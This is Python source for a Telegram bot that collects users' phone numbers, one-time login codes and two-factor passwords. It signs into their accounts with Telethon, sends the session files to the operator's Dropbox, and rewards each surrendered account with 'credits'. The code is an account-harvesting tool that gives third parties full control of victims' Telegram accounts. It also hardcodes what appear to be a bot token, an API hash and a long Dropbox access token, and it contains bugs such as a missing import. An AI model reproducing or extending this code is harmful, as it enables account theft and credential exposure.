
# ---- Your Telegram API keys ----
# ---- Your Telegram API keys ----
import os
import json
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, errors
import dropbox
from telethon.network.connection import ConnectionTcpMTProxyAbridged


from telethon import TelegramClient
from telethon.sessions import StringSession
from dotenv import load_dotenv

# === Telegram API Credentials ===
api_id = 28805917
api_hash = '72b4ff10bcce5ba17dba09f8aa526a44'

# === Proxy Settings ===
# 1) load .env
load_dotenv()

# 2) read creds
api_id   = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")


# === Create Telethon Client ===


# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN ="sl.u.AFs_k1q8vHPybhCZeskA3NPwz8_mNwyNv3sgr5ThXVjRAxwLOD1mY6GZYsT5kbb_eRNXK4D2D59m6GiclU-kQscPUpbu5hBSDzVowNtN4ihRxgOMRzBejhaBbJwIb5DINsqAEBzfJApJM04chsbcEAXjISeM8gAcf6U2jnj62nj-cGv3VIN_43dd00AVHZ-NaRol5vaEDIz38UKXGB8CospXM8CMgZ8nPQJrTa0naxmSCXhcT4hE28zs-O3QS7VXeIa0xXJJBm1AaioyLitxQ_FQA78KjheIafOS2VxU1oFkAiTy85JSNXnrXIkYUmqs5d1dZkgJIJ_mjs24Ueguhet82M4_6ZuwkSVPa_a_4ioumgrgJeP7yXWd2dUXVCf7Etc_YyCZpvtyxwBLX81MlfYHpHp7uoHHDNTLEmJf9OutdiIKshexFBcttKB6sX0tQU5DGc-oYry72p2q9o4eTKd6n-5W1_1ngSjM0TLcA28KAHEgZrWJGQClEQq9mw1PZkD28Rz1IAkSj4_0MQ5YoWYeu1ax3V2DX2N7lC-1iSww4Jqg0Aa6ArwOLk2FIAm22nuIBTcB4rLHuZNl9gzV6kfe1OqjXVZ2z4ioZ3MaD4V12P606Kf1itNVwmdMZX0PXPVmYj3rasIPYUuyk4gomfntRTo9-rLTlYfdtwLeOXGIHTb8zAUtNnn18tHiG2e0y6aEjywNLeDdc7IxnpGcHdBLm4DRFE_Bd3_UfgSsu-FZIZlpgDp8kaLtUOMOHJoJ5qJcrDeb8tEbUuWvyse7pqMf-UL0OhUmM4_obAuzIlhN4KzKZWXkCSPfl7NZx3D64IOTdC63IAyXQtkn-ZEOez4NOcYFXQY9PMSGjS9pM6m77FU3m70_qnXRZxzYQ7Ra6K2lzAt2H8VXgoFkLcrYoJoaEA3j-5sNWTVutQ8e9Bp9QiLOaM5CzPDPdv7OxozPFlHO2v9N0h5rfjfw_QZC6i_RLIZU_pf2nHpDrrQNvpSvR-CaiiLpPnYrLHP9Lrmckh_kCOXBD-UuR5BukFrOM_UPseO773aZYxRX6mlgGdQ6X6jX724iiHeUo2jwwMc-L7Pynto1FvduBODIuV1tFfwBuO00Uqc7xEK0tsT5IeyCazx7GHD24DzGAIJ4FWG8g8bfM4M6e07Jd5PFCe8Xiwt6Ku-P1VSOVs2EHmhEnkYAx85n35GeN6tqap28nKdWqDAahnrYIz8THfLyoSvIjEC31OrhTRnBK3WUTyPoLFqpDI1SmB9GlOxHW0cTBwrDh4sw00ZwD_A2ybULjHalx3_ykMtUecKPBfKTZA2ZbnnhBuRDAFi1VmITitNOpk0qyGFU9-3PgV3kEF-FLhPlEW_Gq_APDy4nFz-ZjlbrrgQdF4CsXsOIyAu1MOtnmEkUgkePiuTjHaOKCXqLToza1JXyUuhx4jK79a8ann19bJwMC4dDbBslcq90tTa5mtK3Ce8"
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Path to store credit files ----
CREDIT_FILE_PATH = "credits"

# Make sure the credits directory exists
os.makedirs(CREDIT_FILE_PATH, exist_ok=True)

# ---- Add Credit to User ----
async def add_credit(user_id, amount):
    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
    
    # Check if the user already has a credit file
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            data = json.load(f)
        # Increase the credit balance
        data["credits"] += amount
    else:
        # If no credit file exists, create a new one with the initial amount
        data = {"credits": amount}
    
    # Save the updated credits to the file
    with open(file_path, "w") as f:
        json.dump(data, f)
    
    return data["credits"]

# ---- Get Credit for User ----
async def get_user_credits(user_id):
    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
    
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            data = json.load(f)
        return data["credits"]
    else:
        return 0  # Default to 0 if no credit file exists

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(
    StringSession(), 
    api_id, 
    api_hash,
    
)

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1)  # Adding 1 credit as an example

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, phone)

        await client.disconnect()

        # Inform the user that their credits have been updated
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1)

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, session["phone"])

        await client.disconnect()

        # Inform the user about their credits
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    """Uploads session file to Dropbox"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")

# ---- Command to check credits ----
async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Get the user's credit balance
    credit_balance = await get_user_credits(user_id)
    
    # Send a message with the current credit balance
    await update.message.reply_text(f"💳 Your current credit balance is: {credit_balance} credits.")

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # Add the /credits command handler to check credits
    app.add_handler(CommandHandler("credits", check_credits))

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
